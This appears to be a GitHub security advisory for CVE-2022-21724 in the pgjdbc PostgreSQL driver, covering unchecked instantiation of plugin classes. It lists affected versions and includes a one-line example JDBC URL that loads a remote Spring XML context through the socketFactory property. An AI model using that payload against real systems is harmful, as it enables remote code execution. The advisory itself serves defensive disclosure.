# [H] pgjdbc Does Not Check Class Instantiation when providing Plugin Classes

## Summary
Severity: High
Advisory: GHSA-v7wg-cpwc-24m4
CVE: CVE-2022-21724
CWE: CWE-665, CWE-668, CWE-74
Ecosystem: Maven
CVSS: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2022-02-02
Source: https://github.com/advisories/GHSA-v7wg-cpwc-24m4
Type: github-advisory

## Affected
- Maven: `org.postgresql:postgresql` — affected >=9.4.1208 <42.2.25
- Maven: `org.postgresql:postgresql` — affected >=42.3.0 <42.3.2

## Details
### Impact

pgjdbc instantiates plugin instances based on class names provided via `authenticationPluginClassName`, `sslhostnameverifier`, `socketFactory`, `sslfactory`, `sslpasswordcallback` connection properties.

However, the driver did not verify if the class implements the expected interface before instantiating the class.

Here's an example attack using an out-of-the-box class from Spring Framework:

```
DriverManager.getConnection("jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml");
```

The first impacted version is REL9.4.1208 (it introduced `socketFactory` connection property)

## References
- https://github.com/pgjdbc/pgjdbc/security/advisories/GHSA-v7wg-cpwc-24m4
- https://nvd.nist.gov/vuln/detail/CVE-2022-21724
- https://github.com/pgjdbc/pgjdbc/commit/f4d0ed69c0b3aae8531d83d6af4c57f22312c813
- https://github.com/pgjdbc/pgjdbc
- https://lists.debian.org/debian-lts-announce/2022/05/msg00027.html
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BVEO7BEFXPBVHSPYL3YKQWZI6DYXQLFS
- https://security.netapp.com/advisory/ntap-20220311-0005
- https://www.debian.org/security/2022/dsa-5196
